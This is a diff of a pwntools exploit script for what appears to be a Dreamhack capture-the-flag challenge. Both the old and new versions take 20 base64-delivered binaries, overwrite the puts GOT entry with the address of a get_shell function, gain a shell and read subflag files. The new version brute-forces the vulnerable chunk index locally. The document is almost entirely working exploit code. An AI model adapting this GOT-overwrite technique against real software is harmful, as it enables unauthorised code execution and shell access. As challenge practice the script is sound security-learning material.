@@ -1,55 +1,46 @@
-from pwn import *
 import os
-import base64
-import re
-s = remote('localhost', 9988)
-s.sendline('y')
+from pwn import *
 
-for i in range(0, 20): # 20 stage
-    os.system('rm target')
-    print s.recvuntil('----------BINARY(base64encoded)----------\n')
-    data = s.recvline()[:-1]
-    with open('target', 'wb') as f:
-        f.write(base64.b64decode(data))
+p = remote("host1.dreamhack.games", 16078)
+context.log_level = 'DEBUG'
 
-    #### symbol get ####
-    elf = ELF('./target')
-    puts = elf.got['puts']
-    get_shell = elf.symbols['get_shell']
+p.sendlineafter('? ', 'y')
 
-    #### freed chunk index get ####
-    disasmed = os.popen("gdb -batch -ex 'file target' -ex 'disassemble main'").read().replace('\n', '')
-    malloc_base = int(re.findall("(?<=rbp\+rax\*8-0x)(.+?)(?=],rdx)", disasmed)[0], 16)
+for i in range(20):
+    file_name = './chall' + str(i)
 
-    freed = re.findall("(?<=rax,QWORD PTR \[rbp-0x)(.+?)(?=<free@plt>)", disasmed)
-    freed = [int(x.split(']')[0],16) for x in freed]
+    p.recvuntil("----------BINARY(base64encoded)----------\n")
+    data = p.recvuntil('-')[:-1].decode("base64")
+    print "hi: " + data
+    a = open(file_name, "wb").write(data)
+    os.system("chmod +x " + file_name)
 
-    last_free = (malloc_base - freed[2])/8
+    idx = 0
+    while True:
+        r = process(file_name)
+        e = ELF(file_name)
+    
+        r.sendlineafter(': ', str(idx))
+        r.sendlineafter(': ', p64(e.got['puts']))
+        r.sendlineafter(': ', p64(e.sym['get_shell']))
 
-    #### attack ####
-    log.info('puts : ' + hex(puts))
-    log.info('get_shell : ' + hex(get_shell))
-    log.info('last_free : ' + hex(last_free))
+        if not r.recvline(timeout=0.5):
+            print('@' +  str(idx))
+            r.close()
+            break
 
-    print s.recvuntil('[+] select chunk to modify(idx) : ')
-    s.sendline(str(last_free))
+        idx += 1
 
-    print s.recvuntil('[+] input data : ')
-    s.sendline(p64(puts))
+        r.close() 
 
-    print s.recvuntil('[+] input comment : ')
-    s.sendline(p64(get_shell))
+    p.sendlineafter(': ', str(idx))
+    p.sendlineafter(': ', p64(e.got['puts']))
+    p.sendlineafter(': ', p64(e.sym['get_shell']))
 
-    sleep(1)
-    s.sendline('cat /tmp/subflag_*')
-    s.sendline('exit')
+    p.sendline("cat /tmp/subflag*")
+    sub = p.recvuntil('}')
+    p.sendline('exit')
+    p.sendline('12313')
+    p.sendlineafter(': ', sub)
 
-    flag = s.recvuntil('}')
-    print 'flag : ' + flag
-
-    sleep(1)
-    s.sendline('1')
-
-    s.sendline(flag)
-
-s.interactive()
+p.interactive()
